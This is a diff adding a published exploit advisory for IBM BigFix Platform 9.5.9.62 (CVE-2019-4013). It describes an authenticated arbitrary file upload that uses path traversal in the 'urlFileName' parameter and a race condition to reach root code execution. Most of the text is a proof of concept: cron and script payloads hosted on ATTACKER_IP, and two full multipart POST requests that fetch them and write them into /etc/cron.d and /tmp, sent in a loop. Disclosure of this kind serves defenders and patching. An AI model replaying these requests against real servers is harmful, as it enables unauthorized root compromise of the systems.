@@ -1,0 +1,180 @@
+# Exploit Title: IBM Bigfix Platform 9.5.9.62 - Arbitrary File Upload
+# Date: 2018-12-11
+# Exploit Authors: Jakub Palaczynski
+# Vendor Homepage: https://www.ibm.com/
+# Version: IBM Bigfix Platform <= 9.5.9.62
+# CVE: CVE-2019-4013
+
+
+Description:
+============
+
+Any authenticated (even unprivileged) user can upload any file to any location on the server with root privileges. This results in code execution on underlying system with root privileges.
+
+What caused this issue:
+* path traversal - it is possible to escape from original directory and upload file to any other location
+* server running with root privileges - user can upload file to ANY location on the system
+* upload any type of file - application does not verify extension and MIME type of uploaded files
+* authorization bypass (reported as separate issue) - any user can reveal privileged functionality and access it without proper rights set
+* possibility to win the race - application uploads file to location specified in "urlFileName" parameter (path traversal), however it then moves it to another. An attacker needs to win race and execute script before it is moved.
+
+Issue was found in "Apps > Software > Add Software" menu. Here user needs to choose upload via URL option as only this one is vulnerable.
+URL needs to point to attacker's web server where he hosts for example script files.
+When form is submitted we can see on proxy "urlFileName" parameter. This one is vulnerable to path traversal. This parameter specifies temporary file name that will be used on the system. Then application moves this file to another location that is not controlled by application user.
+
+An attacker can for example upload script file on the web server and execute it by sending GET request. However as a PoC we will use cron. Here we upload 2 files - cron file and script file that will be executed by cron.
+Uploading cron task and script file is the same as below but of course with different content downloaded from the web server. Those two HTTP requests should be sent in loop to finally win a race and execute our script.
+
+
+Proof of Concept:
+=================
+
+cron.txt served on attacker's web server:
+* * * * * root bash /tmp/icmp.sh
+
+icmp.txt served on attacker's web server:
+#!/bin/bash
+ping -c 3 ATTACKER_IP
+
+
+Uploading cron task:
+POST /swd/api/packages/upload HTTP/1.1
+
+Host: XXX
+
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36
+
+Content-Length: 846
+
+Content-Type: multipart/form-data; boundary=---------------------------7289782871626994727576601809
+
+X-XSRF-TOKEN: XXX
+
+Cookie: _csrf=XXX; XSRF-TOKEN=XXX; user_session=XXX
+
+Connection: close
+
+
+
+-----------------------------7289782871626994727576601809
+
+Content-Disposition: form-data; name="fileURL"
+
+
+
+http://ATTACKER_IP/cron.txt
+
+-----------------------------7289782871626994727576601809
+
+Content-Disposition: form-data; name="username"
+
+
+
+
+
+-----------------------------7289782871626994727576601809
+
+Content-Disposition: form-data; name="password"
+
+
+
+
+
+-----------------------------7289782871626994727576601809
+
+Content-Disposition: form-data; name="urlFileName"
+
+
+
+../../../../../../../../etc/cron.d/task
+
+-----------------------------7289782871626994727576601809
+
+Content-Disposition: form-data; name="urlDownloadAtRuntime"
+
+
+
+false
+
+-----------------------------7289782871626994727576601809
+
+Content-Disposition: form-data; name="uploadId"
+
+
+
+user_1543410578364620
+
+-----------------------------7289782871626994727576601809--
+
+
+Uploading script file:
+POST /swd/api/packages/upload HTTP/1.1
+
+Host: XXX
+
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36
+
+Content-Length: 846
+
+Content-Type: multipart/form-data; boundary=---------------------------7289782871626994727576601809
+
+X-XSRF-TOKEN: XXX
+
+Cookie: _csrf=XXX; XSRF-TOKEN=XXX; user_session=XXX
+
+Connection: close
+
+
+
+-----------------------------7289782871626994727576601809
+
+Content-Disposition: form-data; name="fileURL"
+
+
+
+http://ATTACKER_IP/icmp.txt
+
+-----------------------------7289782871626994727576601809
+
+Content-Disposition: form-data; name="username"
+
+
+
+
+
+-----------------------------7289782871626994727576601809
+
+Content-Disposition: form-data; name="password"
+
+
+
+
+
+-----------------------------7289782871626994727576601809
+
+Content-Disposition: form-data; name="urlFileName"
+
+
+
+../../../../../../../../tmp/icmp.sh
+
+-----------------------------7289782871626994727576601809
+
+Content-Disposition: form-data; name="urlDownloadAtRuntime"
+
+
+
+false
+
+-----------------------------7289782871626994727576601809
+
+Content-Disposition: form-data; name="uploadId"
+
+
+
+user_1543410578364620
+
+-----------------------------7289782871626994727576601809--
+
+
+After a while our script should be executed with root privileges.
